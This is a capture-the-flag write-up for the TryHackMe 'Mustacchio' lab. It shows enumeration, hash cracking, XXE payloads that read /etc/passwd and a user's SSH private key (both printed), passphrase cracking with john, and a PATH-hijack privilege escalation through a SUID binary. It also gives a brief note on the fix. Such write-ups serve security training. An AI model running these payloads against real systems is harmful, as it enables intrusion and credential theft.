---
title: "THM - Mustacchio"
author: NiBi
lang: "en"
categories : ['Try Hack Me']
tags : ['CTF', 'THM','XXE','SUID']
titlepage: true
toc: true
toc-own-page: true
---

# Nmap

As always, we start the enumeration with nmap : 

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.93.229    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 10:31 EDT
Nmap scan report for 10.10.93.229
Host is up (0.079s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds
```

# Port 80

The website looks like a showcase site, all the pages are in HTML and you can't interact with them.

Let's use dirsearch to find some hidden or interesting directories : 

```shell
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.10.251.221/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.251.221/-_22-07-26_09-01-18.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-07-26_09-01-18.log

Target: http://10.10.251.221/

[09:01:19] Starting: 
[09:01:38] 403 -  278B  - /.ht_wsr.txt                                     
[09:01:38] 403 -  278B  - /.htaccess.bak1                                  
[09:01:38] 403 -  278B  - /.htaccess.sample
[09:01:38] 403 -  278B  - /.htaccess.save
[09:01:38] 403 -  278B  - /.htaccess_extra
[09:01:38] 403 -  278B  - /.htaccessBAK
[09:01:38] 403 -  278B  - /.htaccess_sc
[09:01:38] 403 -  278B  - /.htaccess_orig
[09:01:38] 403 -  278B  - /.htaccessOLD
[09:01:38] 403 -  278B  - /.htaccessOLD2
[09:01:38] 403 -  278B  - /.htaccess.orig
[09:01:38] 403 -  278B  - /.htpasswd_test                                  
[09:01:38] 403 -  278B  - /.htm
[09:01:38] 403 -  278B  - /.html                                           
[09:01:38] 403 -  278B  - /.httr-oauth
[09:01:38] 403 -  278B  - /.htpasswds                                      
[09:01:47] 403 -  278B  - /.php                                            
[09:01:47] 403 -  278B  - /.php3                                           
[09:02:38] 200 -    3KB - /about.html                                       
[09:03:39] 200 -    1KB - /contact.html                                     
[09:03:44] 200 -    1KB - /custom/                                          
[09:04:00] 301 -  314B  - /fonts  ->  http://10.10.251.221/fonts/           
[09:04:02] 200 -    2KB - /gallery.html                                     
[09:04:10] 200 -    6KB - /images/                                          
[09:04:10] 301 -  315B  - /images  ->  http://10.10.251.221/images/         
[09:04:13] 200 -    2KB - /index.html                                       
[09:05:06] 200 -   28B  - /robots.txt                                       
[09:05:07] 403 -  278B  - /server-status                                    
[09:05:07] 403 -  278B  - /server-status/                                   
                                                                             
Task Completed                                       
```

Nothing interesting except the /custom/

In /custom/js we find "users.bak", That's quite strange. 

![users.bak](../../assets/mustacchio_users_bak.png)

Inside this file we have : 
```shell
──(kali㉿kali)-[~/Downloads]
└─$ cat users.bak          
��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Using crackstation we find that "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" is bulldog19 hashed with SHA-1.

So we have creds : admin:bulldog19.

I enumerate a lot but i was stuck. I didn't find anything interesting

Let's start the port scan again, we may not have detected a port  : 

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.251.221 -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 09:08 EDT
Nmap scan report for 10.10.251.221
Host is up (0.080s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 577.54 seconds
```

Great ! Port 8765 is open !


# Port 8765
The page ask for a username and a password. I tried with admin and bulldog19 and it's worked.

![main](../../assets/mustachio_home_page.png)

We have a comment section.

In the source code we find this : 

```shell
 <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
  }
</script>
</head>
<body>

<!-- Barry, you can now SSH in using your key!-->
```

We have a user Barry who can use SSH, good to know that.

Inside /auth/dontforget.bak we have : 

```shell
┌──(kali㉿kali)-[~]
└─$ cat Downloads/dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

We know how to use our textbox ! We have to use this XML syntax.

Let's try to use XML injection.

Using [SecList](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-xxe-to-retrieve-files) we find some XML code to read file on a vulnerable target.

I used this one  : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

In the page source code we have : 

```html
    </form>
        <h3>Comment Preview:</h3><p>Name: Joe Hamd</p><p>Author : Barry Clad</p><p>Comment :<br> root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash<p/>    </section>
```

We can read code on the machine with this vulnerability.

We know that barry can use ssh so his key should be on /home/barry/.ssh.id_rsa. Let's try to grab it.
Using this payload :
```shell
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

We get : 

```shell
 <h3>Comment Preview:</h3><p>Name: Joe Hamd</p><p>Author : Barry Clad</p><p>Comment :<br> -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----<p/>    </section>
```

We can now use this key to log in into the ssh server.

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh barry@10.10.93.229 -i barry
Enter passphrase for key 'barry':
```

We need a passphrase... Let's bruteforce it with john.

```shell                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh2john barry > hash                                                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (barry)     
1g 0:00:00:01 DONE (2022-07-26 10:10) 0.8771g/s 2605Kp/s 2605Kc/s 2605KC/s urieljr.k..urielito1000
Use the "--show" op
```


Done ! 

Now, we can access to the SSH server.

# Privilege escalation 

We find an strange file named live_log in joe's home folder.

If we launch it we notice that it display the apache logs.

```shell
barry@mustacchio:/home/joe$ find / -perm /4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
barry@mustacchio:/home/joe$ 
```

We also see that this file is an SUID file ! 

If we exploit it we can become root.

Using strings we see that the file is using "tail -f /var/log/nginx/access.log"

```shell
barry@mustacchio:/home/joe$ strings live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log <-HERE
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

The program is using the tail command. If we add /tmp to the $PATH and we create a file /tmp/tail that starts a shell, the shell will be started by live_log who is a SUID file so we will become root.

# Prevent this attack ?

It is very simple to prevent this attack, instead of using "tail", use "/usr/bin/tail". if you write the entire path, even if someone change the $PATH, /usr/bin/tail will always be launched.

# Let's do it.

```shell
barry@mustacchio:/home/joe$ echo "/bin/bash" > /tmp/tail
barry@mustacchio:/home/joe$ chmod +x /tmp/tail
barry@mustacchio:/home/joe$ /tmp/tail
barry@mustacchio:/home/joe$ PATH=/tmp:$PATH
```

Just launch live_log now !

```shell
barry@mustacchio:/home/joe$ ./live_log
root@mustacchio:/home/joe# cat /root/root.txt
```

And the magic happens ! Thanks for reading !